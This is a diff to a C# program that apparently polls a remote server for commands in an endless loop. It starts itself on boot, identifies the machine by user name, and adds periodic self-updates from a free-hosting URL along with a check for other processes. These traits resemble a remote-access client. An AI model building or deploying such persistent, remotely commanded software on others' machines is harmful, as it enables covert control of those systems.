@@ -13,6 +13,7 @@ internal class Program
 
     private static void Main(string[] args)
     {
+        Log("test2");
 #if DEBUG
         // Set current loglevel to Debug
         currentLevel = LogLevel.Debug;
@@ -23,9 +24,14 @@ internal class Program
 
         // Add --enableui to args
         args = [.. args, "--enableui"];
+
+        Functions.CheckForOtherProcesses();
 #else
         // Handle UI
         Functions.HandleUI(args);
+
+        // Check if there are any other processes running
+        Functions.CheckForOtherProcesses();
 #endif
 
         publicArgs = args;
@@ -45,16 +51,33 @@ internal class Program
         computerId = Environment.UserName;
         computerIdInitials = Functions.GetComputerIdInitials(computerId);
 
+
+
+
 #if !DEBUG
         // Start program on boot
         StartOnBootClass.StartOnBoot();
+
+        // Check if program is executed from the right directory
+        //Functions.CheckDirectory();
 #endif
 
+
+        int loopCount = 0;
         // Initiate main loop
         while (true)
         {
             Loop();
-            Thread.Sleep(waitTime);
+            loopCount++;
+            if (loopCount % 10 == 0)
+            {
+                // Check for updates
+                Version.HandleUpdate();
+            }
+            else
+            {
+                Thread.Sleep(waitTime);
+            }
         }
     }
 
@@ -64,7 +87,7 @@ internal class Program
         try
         {
             // Get commands from the server
-            var commandResult = Commands.GetCommands();
+            Commands.CommandResult commandResult = Commands.GetCommands();
             if (commandResult.Success == false)
             {
                 if (commandResult.ErrorMessage != null)
@@ -119,7 +142,7 @@ static class Settings
 
 partial class Version
 {
-    public const string versionString = "0.0.3";
+    public const string versionString = "0.1.2";
     public static readonly System.Version version = new(versionString);
     public const string versionUrl = "https://site-mm.rf.gd/v2/";
 }
